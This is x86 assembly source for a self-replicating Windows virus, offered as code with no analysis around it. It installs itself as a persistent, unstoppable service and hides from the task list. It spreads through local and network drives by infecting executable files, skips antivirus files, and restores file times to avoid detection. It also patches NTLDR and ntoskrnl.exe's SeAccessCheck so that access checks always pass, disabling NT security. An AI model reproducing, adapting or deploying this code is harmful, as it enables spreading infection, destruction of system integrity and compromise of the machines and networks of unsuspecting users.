   .386

   LARGESTACK

   RADIX        16

   ASSUME       CS:CODE,DS:CODE


   CODE         SEGMENT      USE32


                org          100

   main:

   I            equ          1000 - 300
   @            equ          + ebx - offset VStart

   INCLUDE      HEADER.ASM


   VStart:

   INCLUDE      HEADER.ASM


   ; ------------------------------------------------------------------------- ;
   ; ----------------------------   Startup Code   --------------------------- ;
   ; ------------------------------------------------------------------------- ;


   Virus        PROC         NEAR


                call         GetVS

                lea          esi,[HostCode @]
                mov          edi,[esp]
                sub          edi,08
                mov          [esp],edi
                movsd
                movsd

                push         dword ptr [esp + 04]
                call         RelocKernel32

                or           eax,eax
                jz           short Exit

                cmp          byte ptr [OS @],00
                jnz          short NT_Srv

                call         Create9xProcess
                ret

   NT_Srv:      call         CreateNTService
   Exit:        ret


   Virus                     ENDP


   ; ------------------------------------------------------------------------- ;
   ; --------------------   NT Service Creation Routine   -------------------- ;
   ; ------------------------------------------------------------------------- ;


   CreateNTService           PROC         PASCAL       NEAR


   LOCAL        SCM_Handle : DWORD


                call         RelocAdvapi32

                or           eax,eax
                jz           short CNT_Failed

                push         02
                push         00
                push         00               ; get the service control manager
                call         OpenSCManagerA   ; handler

                or           eax,eax
                jz           short CNT_Failed

                mov          SCM_Handle,eax

                call         CreateExecutable

                or           eax,eax        ; if process is running, just exit
                jz           short CNT_Exit

                mov          edi,0F01FF
                lea          esi,[Service @]
                push         edi
                push         esi
                push         SCM_Handle
                call         OpenServiceA

                or           eax,eax
                jnz          short CNT_Run

                xor          eax,eax
                push         eax
                push         eax
                push         eax
                push         eax
                push         eax
                lea          eax,[Buffer1 @] ; -> flcss.exe
                push         eax
                push         01              ; ErrorControl
                push         02              ; Start
                push         20              ; Type
                push         edi
                push         00
                push         esi
                push         SCM_Handle
                call         CreateServiceA

                or           eax,eax
                jz           short CNT_Failed

   CNT_Run:

                push         00
                push         00
                push         eax
                call         StartServiceA

                or           eax,eax
                jnz          short CNT_Exit

   CNT_Failed:

                call         StartInfectionThread

   CNT_Exit:

                ret


   CreateNTService           ENDP


   ; ------------------------------------------------------------------------- ;
   ; --------------------   W9x Process Creation Routine   ------------------- ;
   ; ------------------------------------------------------------------------- ;


   Create9xProcess           PROC         NEAR


                call         CreateExecutable

                or           eax,eax
                jz           short P9x_Exit

   P9x_00:

                xor          eax,eax
                lea          edi,[Buffer2 @]
                push         edi
                push         edi
                mov          ecx,040
                repz         stosd

                mov          cl,06
                push         eax
                loop         $ - 1

                lea          esi,[Buffer1 @]
                push         esi
                push         00
                call         CreateProcessA

                or           eax,eax
                jnz          short P9x_Exit

   P9x_Failed:

                call         StartInfectionThread

   P9x_Exit:
                ret


   Create9xProcess           ENDP


   ; ------------------------------------------------------------------------- ;
   ; ---------------------   flcss.exe Creation Routine   -------------------- ;
   ; ------------------------------------------------------------------------- ;


   CreateExecutable       PROC         PASCAL       NEAR


   LOCAL        c_FileHandle   : DWORD, \
                c_BytesWritten : DWORD

   USES         esi,edi


                lea          edi,[Buffer1 @]
                push         edi

                push         104
                push         edi
                call         GetSystemDirectoryA

                add          edi,eax
                mov          al,'\'
                stosb
                lea          esi,[Process @]
                movsd
                movsd
                movsd

                push         02           ; create always
                call         OpenFile

                cmp          eax,-1
                jz           short CE_Exit

                mov          c_FileHandle,eax

                lea          edi,[VImports + 4 @]      ; clean main import table
                mov          eax,-1
                stosd
                stosd

                lea          edi,[Kernel32_Relocated @] ; restore 2nd imp. table
                mov          eax,[edi - 8]              ; (necessary for NT)
                stosd

                push         00
                lea          esi,c_BytesWritten
                push         esi
                push         0200
                push         ebx
                push         c_FileHandle
                call         WriteFile                 ; write header

                push         00
                push         esi
                push         Phys_VSize
                push         ebx
                push         c_FileHandle
                call         WriteFile                 ; write vrs

                push         c_FileHandle
                call         CloseHandle

   CE_Exit:

                inc          eax
                ret


   CreateExecutable          ENDP


   ; ------------------------------------------------------------------------- ;
   ; ---------------------------   Viral Service   --------------------------- ;
   ; ------------------------------------------------------------------------- ;


   VService                  PROC         NEAR


                call         GetVS

                push         dword ptr [esp]
                call         RelocKernel32

                or           eax,eax
                jz           VS_Exit

                cmp          byte ptr [OS @],00
                jz           short W9x_Service_Register


   WNT_Service_Hacknowledge:


                call         RelocAdvapi32
                or           eax,eax
                jz           VS_Exit

                lea          esi,[Buffer1 @]

                xor          eax,eax
                lea          ecx,[Service @]
                lea          edx,[ServiceDispatcher @]
                mov          [esi],ecx
                mov          [esi + 04],edx
                mov          [esi + 08],eax
                mov          [esi + 0C],eax       ; give control back to caller
                                                  ; and jump to dispatcher
                push         esi
                call         StartServiceCtrlDispatcherA


   W9x_Service_Register:


                lea          esi,[USER32_Name @]
                push         esi
                call         LoadLibraryA

                lea          esi,[RegisterClassA + 7 @]
                push         esi
                push         eax
                call         GetProcAddress

                or           eax,eax
                jz           short VS_00

                mov          [esi - 06],eax

                lea          esi,[Buffer1 @]
                mov          edi,esi
                xor          eax,eax
                mov          ecx,0A
                repz         stosd

                mov          dword ptr [esi + 04],-1       ; ? (must be <> 0)
                mov          dword ptr [esi + 10],400000   ; image base
                lea          eax,[Service @]
                mov          [esi + 24],eax

                push         esi
                call         RegisterClassA      ; necessary, or RSP won't work

                lea          esi,[RegisterServiceProcess + 7 @]
                push         esi
                push         dword ptr [Kernel32_Base @]
                call         GetProcAddress

                or           eax,eax
                jz           short VS_00

                mov          [esi - 06],eax

                call         GetCurrentProcessId
                                                 ; register our process in order
                push         01                  ; to vanish from the task list
                push         eax
                call         RegisterServiceProcess

                push         8*1000d      ; wait 8 seconds
                call         Sleep

   VS_00:
                call         StartInfectionThread

   VS_Exit:
                ret


   VService                  ENDP


   ; ------------------------------------------------------------------------- ;
   ; -----------------------   NT Service Dispatcher   ----------------------- ;
   ; ------------------------------------------------------------------------- ;


   ServiceDispatcher         PROC         PASCAL       NEAR


   LOCAL        Service_Handle : DWORD


                call         GetVS

                lea          esi,[ServiceHandler @]
                lea          edi,[Service @]
                push         esi
                push         edi
                call         RegisterServiceCtrlHandlerA

                mov          Service_Handle,eax

                lea          esi,[Buffer1 @]
                mov          edi,esi
                mov          ecx,06
                xor          eax,eax
                repz         stosd

                mov          dword ptr [esi],10
                mov          dword ptr [esi + 04],04
                mov          dword ptr [esi + 08],07

                push         esi
                push         Service_Handle     ; now tell windows our service
                call         SetServiceStatus   ; correctly started

                push         8*1000d
                call         Sleep

                call         StartInfectionThread
                ret


   ServiceDispatcher         ENDP


   ; ------------------------------------------------------------------------- ;
   ; --------------------------   Service Handler   -------------------------- ;
   ; ------------------------------------------------------------------------- ;


   ServiceHandler            PROC         NEAR


                ret                       ; if the admin tries to halt the
                                          ; service, he'll get a system error

   ServiceHandler            ENDP


   ; ------------------------------------------------------------------------- ;
   ; -------------------   Thread Creation Routine   ------------------ ;
   ; ------------------------------------------------------------------------- ;


   StartInfectionThread     PROC         PASCAL       NEAR


   LOCAL        ThreadId : DWORD


                call         GetTickCount
                mov          [Rand @],eax

                lea          eax,ThreadId
                push         eax
                push         0
                push         0
                lea          eax,[VThread @]
                push         eax
                push         0
                push         0
                call         CreateThread
                ret


   StartInfectionThread     ENDP


   ; ------------------------------------------------------------------------- ;
   ; ----------------------------   Viral Thread   --------------------------- ;
   ; ------------------------------------------------------------------------- ;


   VThread                   PROC         NEAR


                call         GetVS

                call         InfectDrives

                push         60d * 1000d
                call         Sleep

                call         GetRand
                and          al,1F
                jnz          short VThread

                call         InfectNetwork
                jmp          short VThread


   VThread                   ENDP


   ; ------------------------------------------------------------------------- ;
   ; ---------------------   Network Infection Routine   --------------------- ;
   ; ------------------------------------------------------------------------- ;


   InfectNetwork             PROC         NEAR


                lea          eax,[MPR_Name @]
                push         eax
                call         LoadLibraryA

                or           eax,eax
                jz           short INet_Failed

                push         eax
                lea          esi,[MPR_Functions @]
                push         esi
                call         DLL_Relocate

                or           eax,eax
                jz           short INet_Failed

                push         00
                call         NetSearch

   INet_Failed:

                ret


   InfectNetwork            ENDP


   ; ------------------------------------------------------------------------- ;
   ; ----------------------   Valid Drive Test Routine   --------------------- ;
   ; ------------------------------------------------------------------------- ;


   InfectDrives              PROC         NEAR


                push         esi

                call         GetTickCount
                mov          [Tick @],eax

                lea          esi,[Buffer1 @]
                mov          dword ptr [esi],' \:@'

   ID_TestDrive:

                mov          byte ptr [esi + 03],00
                push         esi
                call         GetDriveTypeA

                cmp          al,03                     ; fixed disk
                jz           short ID_DriveOk

                cmp          al,04                     ; network drive
                jnz          short ID_Invalid

   ID_DriveOk:

                add          esi,03

                push         esi
                call         BlownAway

                push         esi
                call         FileSearch

                sub          esi,03

   ID_Invalid:

                mov          al,[Buffer1 @]
                inc          al
                mov          [Buffer1 @],al

                cmp          al,'Z'
                jna          short ID_TestDrive

                pop          esi
                ret


   InfectDrives              ENDP


   ; ------------------------------------------------------------------------- ;
   ; -----------------   Recursive Computer Search Routine   ----------------- ;
   ; ------------------------------------------------------------------------- ;


   NetSearch                 PROC         PASCAL      NEAR


   ARG          WNetStructAddr:DWORD      ; pointer to the network struct (20h)

   LOCAL        EnumBufferAddr:DWORD, \   ; network buffer address
                EnumBufferSize:DWORD, \   ; network buffer size (4000h)
                EnumNB_Objects:DWORD      ; number of network structs enumerated

   USES         esi, edi


                mov          EnumBufferSize,4000
                or           EnumNB_Objects,-1

                lea          eax,WNetStructAddr
                push         eax
                push         WNetStructAddr
                push         0
                push         0
                push         2
                call         WNetOpenEnumA

                or           eax,eax
                jnz          NET_Close

                push         04
                push         1000
                push         4000
                push         00
                call         VirtualAlloc

                or           eax,eax
                jz           short NET_Close

                mov          EnumBufferAddr,eax

   NET_00:

                mov          esi,EnumBufferAddr

                lea          eax,EnumBufferSize
                push         eax
                push         esi
                lea          eax,EnumNB_Objects
                push         eax
                push         WNetStructAddr
                call         WNetEnumResourceA

                or           eax,eax
                jnz          short NET_Free

                mov          ecx,EnumNB_Objects
                or           ecx,ecx
                jz           short NET_00

   NET_01:
                push         ecx
                push         esi

                mov          esi,[esi + 14]            ; computer resource name
                or           esi,esi                   ; (\\XXX\C, for example)
                jz           short NET_03

                cmp          word ptr [esi],0041       ; floppy ?
                jz           short NET_03

                lea          edi,[Buffer1 @]

   NET_02:

                movsb
                cmp          byte ptr [esi],00
                jnz          short NET_02

                mov          al,'\'
                stosb

                push         edi
                call         BlownAway

                push         edi
                call         FileSearch

   NET_03:

                pop          esi

                mov          eax,[esi + 0C]
                and          al,2
                cmp          al,2
                jnz          short NET_04

                push         esi
                call         NetSearch

   NET_04:
                add          esi,20
                pop          ecx
                loop         NET_01

                jmp          short NET_00

   NET_Free:
                push         8000
                push         00
                push         EnumBufferAddr
                call         VirtualFree

   NET_Close:
                push         WNetStructAddr
                call         WNetCloseEnum
                ret


   NetSearch                 ENDP


   ; ------------------------------------------------------------------------- ;
   ; -------------------   Recursive File Search Routine   ------------------- ;
   ; ------------------------------------------------------------------------- ;


   FileSearch           PROC         PASCAL       NEAR


   ARG          CurrentDirEnd : DWORD
   LOCAL        SearchHandle  : DWORD
   USES         esi,edi


                mov          eax,CurrentDirEnd
                mov          dword ptr [eax],002A2E2A  ; *.*

                lea          edi,[Buffer2 @]
                lea          esi,[Buffer1 @]
                push         edi
                push         esi
                call         FindFirstFileA

                cmp          eax,-1
                jz           short RS_Exit

   RS_00:
                mov          SearchHandle,eax

   RS_01:
                test         byte ptr [edi],10         ; dir ?
                jz           short FileTest

   RS_Directory:

                cmp          byte ptr [edi + 2C],'.'
                jz           short RS_Next

                mov          esi,edi
                add          esi,2C

                mov          edi,CurrentDirEnd

   RSD_00:
                movsb
                cmp          byte ptr [esi],0
                jnz          short RSD_00

                mov          al,'\'
                stosb

                push         edi
                call         FileSearch

   RS_Next:
                lea          edi,[Buffer2 @]
                push         edi
                push         SearchHandle
                call         FindNextFileA

                or           eax,eax
                jnz          short RS_01

                push         SearchHandle
                call         FindClose

   RS_Exit:
                ret

   FileTest:

                mov          edx,[edi + 2C]
                or           edx,20202020
                xor          edx,61F81F61

                lea          esi,[SkipNames @]         ; check av names
                mov          ecx,0C

   FT_00:
                lodsd
                cmp          edx,eax
                jz           short FT_Exit

                loop         FT_00

                mov          esi,edi
                add          esi,2C

   FT_01:
                lodsb
                or           al,al
                jnz          short FT_01

                mov          eax,[esi - 4]             ; check extent
                or           eax,20202020

                cmp          eax,' xco'
                jz           short FT_02

                cmp          eax,' rcs'
                jz           short FT_02

                cmp          eax,' exe'
                jnz          short FT_Exit

   FT_02:
                mov          eax,[edi + 20]            ; minimum file size
                cmp          eax,2000
                jc           short FT_Exit

                cmp          al,03                     ; self-infection test
                jz           short FT_Exit

                lea          esi,[Buffer1 @]            ; get complete file name
                lea          edi,[Buffer3 @]            ; with path
                push         edi

                mov          ecx,CurrentDirEnd
                sub          ecx,esi
                repz         movsb

                lea          esi,[Buffer2 @]
                add          esi,2C

   FT_03:
                movsb
                cmp          byte ptr [esi - 1],0
                jnz          short FT_03

                call         InfectFile

   FT_Exit:
                jmp          RS_Next


   FileSearch           ENDP


   ; ------------------------------------------------------------------------- ;
   ; -----------------------   File Infection Routine   ---------------------- ;
   ; ------------------------------------------------------------------------- ;


   InfectFile                PROC         PASCAL       NEAR


   ARG          i_Filename    : DWORD

   LOCAL        i_FileHandle  : DWORD, \
                i_FileSize    : DWORD, \
                i_BytesRead   : DWORD, \
                i_VirusOffset : DWORD, \
                i_MapHandle   : DWORD, \
                i_HostDep32   : DWORD, \
                i_EP_Offset   : DWORD


   USES         esi,edi


                push         i_Filename
                push         03           ; open existing
                call         OpenFile

                cmp          eax,-1
                jz           IN_Exit

                mov          i_FileHandle,eax

                push         00
                push         eax
                call         GetFileSize

                mov          i_FileSize,eax

                cmp          al,03                     ; re-test if not already
                jz           IN_Exit                   ; infected

                lea          edi,[Buffer3 @]

                push         00
                lea          esi,i_BytesRead
                push         esi
                push         2000
                push         edi
                push         i_FileHandle
                call         ReadFile

                cmp          word ptr [edi],5A4Dh
                jnz          IN_CloseFile

                cmp          word ptr [edi + 18],0040
                jnz          IN_CloseFile

                cmp          dword ptr [edi + 3C],1C00   ; Check DOS header size
                ja           IN_CloseFile

                add          edi,[edi + 3C]

                mov          eax,[edi]
                cmp          eax,00004550
                jnz          IN_CloseFile

                cmp          word ptr [edi + 5C],2     ; Subsystem == GUI
                jnz          IN_CloseFile

                mov          esi,edi
                add          esi,18
                add          si,[edi + 14]             ; esi -> 1st section
                push         esi

                mov          eax,[edi + 28]            ; now search for the
                                                       ; section which contains
   IN_00:                                              ; the EP
                mov          ecx,[esi + 0C]
                add          ecx,[esi + 08]

                cmp          eax,ecx
                jc           short IN_01

                add          esi,28
                jmp          short IN_00

   IN_01:
                sub          eax,[esi + 0C]
                add          eax,[esi + 14]
                mov          i_EP_Offset,eax

                or           [esi + 24],80000000       ; make it writeable

                pop          esi
                xor          ecx,ecx
                mov          cx,[edi + 06]
                dec          ecx
                mov          eax,ecx
                mov          edx,28
                mul          edx
                add          esi,eax                   ; esi -> last section

                mov          eax,[esi + 24]
                cmp          al,80                     ; uninitialized ?
                jz           IN_CloseFile

                or           eax,8C000000         ; writeable, not cached/paged
                and          eax,not 12000000     ; not shared/discardable
                mov          [esi + 24],eax

                mov          ecx,i_FileSize            ; don't infect SFX
                mov          edx,ecx
                mov          eax,ecx
                clc
                shr          eax,03
                sub          edx,eax
                sub          edx,[esi + 14]
                jc           short IN_02

                sub          edx,[esi + 10]
                jnc          IN_CloseFile

   IN_02:                                     ; calculate new last section size

                mov          edx,[esi + 08]

                sub          ecx,[esi + 14]
                jc           short IN_03

                cmp          edx,ecx
                ja           short IN_03

                mov          edx,ecx

   IN_03:
                test         edx,00000FFF              ; align on 1000h
                jz           short IN_04

                and          edx,0FFFFF000
                add          edx,1000

   IN_04:
                mov          ecx,edx
                add          ecx,[esi + 0C]
                mov          eax,ecx
                add          eax,Virt_VSize
                mov          [edi + 50],eax            ; new image size

                sub          ecx,[edi + 28]
                add          ecx,offset VStart - 100 - 08
                mov          i_HostDep32,ecx

                mov          eax,edx
                add          eax,Virt_VSize            ; increase virtual size
                mov          [esi + 08],eax

                mov          eax,edx
                add          eax,[esi + 14]
                mov          i_VirusOffset,eax

                add          edx,Phys_VSize            ; increase phys. size
                mov          [esi + 10],edx
                add          edx,[esi + 14]
                add          edx,03

                push         i_FileHandle
                push         edx
                call         MapFile

                or           eax,eax
                jz           short IN_CloseFile

                mov          i_MapHandle,eax

                push         eax
                call         ViewMap

                or           eax,eax
                jz           short IN_CloseMap

                mov          edx,eax

                lea          esi,[Buffer3 @]           ; write header
                mov          edi,edx
                mov          ecx,2000
                repz         movsb

                lea          edi,[HostCode @]
                mov          esi,i_EP_Offset
                add          esi,edx
                movsd
                movsd

                mov          edi,esi                   ; set up call gs:Virus
                sub          edi,08
                mov          eax,00E8659090
                stosd
                mov          eax,i_HostDep32
                stosd

                mov          edi,edx                   ; fill with blanks
                mov          eax,i_FileSize
                mov          ecx,i_VirusOffset
                sub          ecx,eax
                jna          short IN_05

                add          edi,eax
                xor          al,al
                repz         stosb

   IN_05:
                mov          esi,ebx                   ; write vrs
                mov          edi,edx
                add          edi,i_VirusOffset
                mov          ecx,VSize
                repz         movsb

                mov          ecx,Phys_VSize - VSize + 3
                repz         stosb

                push         edx
                call         UnmapViewOfFile

   IN_CloseMap:

                push         i_MapHandle
                call         CloseHandle

                call         Wait_A_Little

   IN_CloseFile:

                lea          esi,[Buffer2 + 14 @]      ; restore file time
                push         esi
                sub          esi,08
                push         esi
                sub          esi,08
                push         esi
                push         i_FileHandle
                call         SetFileTime

                push         i_FileHandle
                call         CloseHandle

   IN_Exit:
                ret


   InfectFile                ENDP


   ; ------------------------------------------------------------------------- ;
   ; -------------------   GetProcAddress Search Routine   ------------------- ;
   ; ------------------------------------------------------------------------- ;


   Whereis_GPA               PROC         PASCAL       NEAR


   ARG          w_Kernel32 : DWORD
   USES         esi,edi


                lea          esi,[GPA_Sigs @]

                mov          byte ptr [OS @],00

                mov          eax,w_Kernel32
                and          eax,0FFF00000

                cmp          eax,0BFF00000
                jnz          short OS_WinNT?

   OS_Win9x:

                mov          edi,0BFF70000
                jmp          short WG_00

   OS_WinNT?:

                inc          byte ptr [OS @]
                add          esi,08
                cmp          eax,077F00000
                jnz          short OS_Win2K?

                mov          edi,eax
                jmp          short WG_00

   OS_Win2K?:

                inc          byte ptr [OS @]
                add          esi,08
                cmp          eax,077E00000
                jnz          short WG_Failed

                mov          edi,077E80000

   WG_00:

                mov          edx,edi
                mov          ecx,20000

   WG_01:
                push         ecx
                mov          ecx,08
                push         esi
                push         edi
                repz         cmpsb
                pop          edi
                pop          esi
                pop          ecx
                jz           short WG_02
                inc          edi
                loop         WG_01

   WG_Failed:

                xor          eax,eax
                jmp          short WG_03

   WG_02:
                add          edi,03
                mov          [GetProcAddress + 1 @],edi

                mov          eax,edx
                mov          [Kernel32_Base @],eax

   WG_03:
                ret


   Whereis_GPA               ENDP


   ; ------------------------------------------------------------------------- ;
   ; ------------------   DLL Functions Relocation Routine   ----------------- ;
   ; ------------------------------------------------------------------------- ;


   DLL_Relocate              PROC         PASCAL       NEAR


   ARG          DLL_Base : DWORD, \
                DLL_Func : DWORD

   USES         esi


                mov          esi,DLL_Func

   DR_00:
                mov          eax,esi
                add          eax,07
                push         eax
                push         DLL_Base
                call         GetProcAddress

                or           eax,eax
                jz           short DR_03

   DR_01:
                mov          [esi + 1],eax
                add          esi,07

   DR_02:
                lodsb
                or           al,al
                jnz          short DR_02

                cmp          byte ptr [esi],0B8
                jz           short DR_00

   DR_03:
                ret


   DLL_Relocate              ENDP


   ; ------------------------------------------------------------------------- ;
   ; ---------------------   NT Security Patch Routine   --------------------- ;
   ; ------------------------------------------------------------------------- ;


   BlownAway                 PROC         PASCAL       NEAR


   ARG          DirEnd : DWORD
   USES         esi,edi


                lea          esi,[NTLDR @]
                mov          edi,DirEnd
                movsd
                movsd

                lea          edi,[Buffer1 @]
                lea          esi,[NT4_NTLDR @]

                cmp          byte ptr [OS @],01
                jz           short BA_00
                add          esi,5 * 2

   BA_00:

                push         edi
                push         esi
                push         05
                call         PatchFile

                lea          esi,[NTOSKRNL @]
                mov          edi,DirEnd

   BA_01:

                movsb
                cmp          byte ptr [esi - 1],00
                jnz          short BA_01

                lea          edi,[Buffer1 @]
                lea          esi,[NT4_NTOSKRNL @]

                cmp          byte ptr [OS @],01
                jz           short BA_02
                add          esi,9 * 2

   BA_02:

                push         edi
                push         esi
                push         09
                call         PatchFile
                ret

   BlownAway                 ENDP


   ; ------------------------------------------------------------------------- ;
   ; -------------------------   File Patch Routine   ------------------------ ;
   ; ------------------------------------------------------------------------- ;


   PatchFile                 PROC         PASCAL       NEAR


   ARG          p_Filename   : DWORD, \
                p_PatchAddr  : DWORD, \
                p_PatchSize  : DWORD

   LOCAL        p_FileHandle : DWORD, \
                p_FileSize   : DWORD, \
                p_MapHandle  : DWORD


   USES         esi,edi


                push         p_Filename
                push         03           ; open existing
                call         OpenFile

                cmp          eax,-1
                jz           short PA_Exit

                mov          p_FileHandle,eax

                push         00
                push         eax
                call         GetFileSize

                mov          p_FileSize,eax

                push         p_FileHandle
                push         eax
                call         MapFile

                or           eax,eax
                jz           short PA_CloseFile

                mov          p_MapHandle,eax

                push         eax
                call         ViewMap

                or           eax,eax
                jz           short PA_CloseMap

                mov          edx,eax

                mov          edi,eax
                mov          esi,p_PatchAddr
                mov          ecx,p_FileSize

   PA_00:

                push         ecx
                push         esi
                push         edi
                mov          ecx,p_PatchSize
                repz         cmpsb
                pop          edi
                pop          esi
                pop          ecx
                jz           short PA_01
                inc          edi
                loop         PA_00

                jmp          short PA_Unmap

   PA_01:

                mov          ecx,p_PatchSize
                add          esi,ecx
                repz         movsb

   PA_Unmap:

                push         edx
                call         UnmapViewOfFile

   PA_CloseMap:

                push         p_MapHandle
                call         CloseHandle

   PA_CloseFile:

                push         p_FileHandle
                call         CloseHandle

   PA_Exit:
                ret


   PatchFile                 ENDP


   ; ------------------------------------------------------------------------- ;
   ; ---------------------------   Minor Routines   -------------------------- ;
   ; ------------------------------------------------------------------------- ;


   GetVS:

                call         $ + 5
                pop          ebx
                sub          ebx,offset GetVS + 5 - VStart
                ret


   ; ------------------------------------------------------------------------- ;
   ; ------------------------------------------------------------------------- ;


   RelocKernel32             PROC         PASCAL       NEAR


   ARG          r_Kernel32 : DWORD


                push         r_Kernel32
                call         Whereis_GPA

                or           eax,eax
                jz           short RK_00

                push         eax
                lea          esi,[Kernel32_Functions @]
                push         esi
                call         DLL_Relocate
   RK_00:
                ret


   RelocKernel32             ENDP


   ; ------------------------------------------------------------------------- ;
   ; ------------------------------------------------------------------------- ;


   RelocAdvapi32             PROC         NEAR


                lea          eax,[ADVAPI32_Name @]
                push         eax
                call         LoadLibraryA
                or           eax,eax
                jz           short RA_00

                push         eax
                lea          esi,[ADVAPI32_Functions @]
                push         esi
                call         DLL_Relocate

   RA_00:
                ret


   RelocAdvapi32             ENDP


   ; ------------------------------------------------------------------------- ;
   ; ------------------------------------------------------------------------- ;


   OpenFile                  PROC         PASCAL       NEAR


   ARG          o_Filename : DWORD, \
                o_OpenMode : DWORD

                push         20
                push         o_Filename
                call         SetFileAttributesA

                push         00
                push         80                        ; normal attributes
                push         o_OpenMode
                push         00
                push         00                        ; not shared
                push         0C0000000                 ; r/w
                push         o_Filename
                call         CreateFileA
                ret


   OpenFile                  ENDP


   ; ------------------------------------------------------------------------- ;
   ; ------------------------------------------------------------------------- ;


   MapFile                   PROC         PASCAL       NEAR


   ARG          m_FileHandle : DWORD, \
                m_FileSize   : DWORD


                push         00
                push         m_FileSize
                push         00
                push         04
                push         00
                push         m_FileHandle
                call         CreateFileMappingA
                ret


   MapFile                   ENDP


   ; ------------------------------------------------------------------------- ;
   ; ------------------------------------------------------------------------- ;


   ViewMap                   PROC         PASCAL       NEAR


   ARG          v_MapHandle : DWORD


                push         00
                push         00
                push         00
                push         02
                push         v_MapHandle
                call         MapViewOfFile
                ret


   ViewMap                   ENDP


   ; ------------------------------------------------------------------------- ;
   ; ------------------------------------------------------------------------- ;


   Wait_A_Little             PROC         NEAR


                call         GetTickCount
                sub          eax,[Tick @]              ; allow thread to
                                                       ; run for 4 seconds
                cmp          eax,4*1000d
                jc           short WAL_00

                push         16d*1000d                 ; then wait 16 seconds
                call         Sleep

                call         GetTickCount
                mov          [Tick @],eax
   WAL_00:
                ret


   Wait_A_Little             ENDP


   ; ------------------------------------------------------------------------- ;
   ; ------------------------------------------------------------------------- ;


   GetRand                   PROC         NEAR

                push         ecx
                push         edx
                mov          eax,[Rand @]
                xor          edx,edx
                mov          ecx,7FFFFFFF
                mul          ecx
                inc          eax
                mov          ecx,0FFFFFFFBh
                div          ecx
                mov          eax,edx
                mov          [Rand @],eax
                pop          edx
                pop          ecx
                ret


   GetRand                   ENDP


   ; ------------------------------------------------------------------------- ;
   ; --------------------------   INITIALIZED DATA   ------------------------- ;
   ; ------------------------------------------------------------------------- ;


   HostCode     db           8 dup (?)


   GPA_Sigs:

   W9x          db           0C2,04,00,57,6A,22,2Bh,0D2
   NT4          db           0C2,04,00,55,8Bh,4C,24,0C
   W2K          db           00F,00,00,55,8Bh,0ECh,51,51


   NTLDR        db           'NTLDR',0

   NT4_NTLDR    db           3Bh,46,58,74,07           ; signature (file check)
                db           3Bh,46,58,0EBh,07         ; patch

   W2K_NTLDR    db           3Bh,47,58,74,07
                db           3Bh,47,58,0EBh,07


   NTOSKRNL     db           'WINNT\System32\ntoskrnl.exe',0

   NT4_NTOSKRNL db           8A,0C3,5F,5E,5Bh,5Dh,0C2,28,00  ; SeAccessCheck
                db           0B0,01,5F,5E,5Bh,5Dh,0C2,28,00

   W2K_NTOSKRNL db           8A,45,14,5F,5E,5Bh,5Dh,0C2,28
                db           0B0,01,90,5F,5E,5Bh,5Dh,0C2,28

   SkipNames:

                dd           139D7300h ; aler
                dd           0F977200h ; amon
                dd           118E7E1Eh ; _avp
                dd           52886900h ; avp3
                dd           0C886900h ; avpm
                dd           13883207h ; f-pr
                dd           168E7E0Fh ; navw
                dd           0F997C12h ; scan
                dd           128B7212h ; smss
                dd           04907B05h ; ddhe
                dd           00946F05h ; dpla
                dd           00946F0Ch ; mpla


   Process      db           'flcss.exe',0
   Service      db           'FLC',0

   ; Minimal Import Section

   VImports:
                             dd           offset Kernel32_Pointers     + I
                             dd           -1,-1
                             dd           offset Kernel32_Name         + I
                             dd           offset Kernel32_Relocated    + I
                             db           14 dup (0)

   Kernel32_Pointers         dd           offset Kernel32_Beep         + I, 0
   Kernel32_Relocated        dd           offset Kernel32_Beep         + I, 0
   Kernel32_Beep             db           ?,?,'Beep',0


   ; Virus Imports

   Kernel32_Name             db           'KERNEL32.dll',0
   Kernel32_Functions:

   CloseHandle:              db           0B8,?,?,?,?,0FF,0E0,'CloseHandle',0
   CreateFileA:              db           0B8,?,?,?,?,0FF,0E0,'CreateFileA',0
   CreateFileMappingA:       db           0B8,?,?,?,?,0FF,0E0,'CreateFileMappingA',0
   CreateProcessA:           db           0B8,?,?,?,?,0FF,0E0,'CreateProcessA',0
   CreateThread:             db           0B8,?,?,?,?,0FF,0E0,'CreateThread',0
   FindFirstFileA:           db           0B8,?,?,?,?,0FF,0E0,'FindFirstFileA',0
   FindNextFileA:            db           0B8,?,?,?,?,0FF,0E0,'FindNextFileA',0
   FindClose:                db           0B8,?,?,?,?,0FF,0E0,'FindClose',0
   GetCurrentProcessId:      db           0B8,?,?,?,?,0FF,0E0,'GetCurrentProcessId',0
   GetDriveTypeA:            db           0B8,?,?,?,?,0FF,0E0,'GetDriveTypeA',0
   GetFileSize:              db           0B8,?,?,?,?,0FF,0E0,'GetFileSize',0
   GetProcAddress:           db           0B8,?,?,?,?,0FF,0E0,'GetProcAddress',0
   GetTickCount:             db           0B8,?,?,?,?,0FF,0E0,'GetTickCount',0
   GetSystemDirectoryA:      db           0B8,?,?,?,?,0FF,0E0,'GetSystemDirectoryA',0
   LoadLibraryA:             db           0B8,?,?,?,?,0FF,0E0,'LoadLibraryA',0
   MapViewOfFile:            db           0B8,?,?,?,?,0FF,0E0,'MapViewOfFile',0
   ReadFile:                 db           0B8,?,?,?,?,0FF,0E0,'ReadFile',0
   SetFileAttributesA:       db           0B8,?,?,?,?,0FF,0E0,'SetFileAttributesA',0
   SetFileTime:              db           0B8,?,?,?,?,0FF,0E0,'SetFileTime',0
   Sleep:                    db           0B8,?,?,?,?,0FF,0E0,'Sleep',0
   UnmapViewOfFile:          db           0B8,?,?,?,?,0FF,0E0,'UnmapViewOfFile',0
   VirtualAlloc:             db           0B8,?,?,?,?,0FF,0E0,'VirtualAlloc',0
   VirtualFree:              db           0B8,?,?,?,?,0FF,0E0,'VirtualFree',0
   WriteFile:                db           0B8,?,?,?,?,0FF,0E0,'WriteFile',0

   ; this function does only exist under Win9x

                             db           0
   RegisterServiceProcess:   db           0B8,?,?,?,?,0FF,0E0,'RegisterServiceProcess',0

   USER32_Name               db           'USER32.dll',0
   RegisterClassA:           db           0B8,?,?,?,?,0FF,0E0,'RegisterClassA',0

   ADVAPI32_Name             db           'ADVAPI32.dll',0
   ADVAPI32_Functions:

   OpenSCManagerA:           db           0B8,?,?,?,?,0FF,0E0,'OpenSCManagerA',0
   OpenServiceA:             db           0B8,?,?,?,?,0FF,0E0,'OpenServiceA',0
   CreateServiceA:           db           0B8,?,?,?,?,0FF,0E0,'CreateServiceA',0
   StartServiceA:            db           0B8,?,?,?,?,0FF,0E0,'StartServiceA',0
   StartServiceCtrlDispatcherA:  db       0B8,?,?,?,?,0FF,0E0,'StartServiceCtrlDispatcherA',0
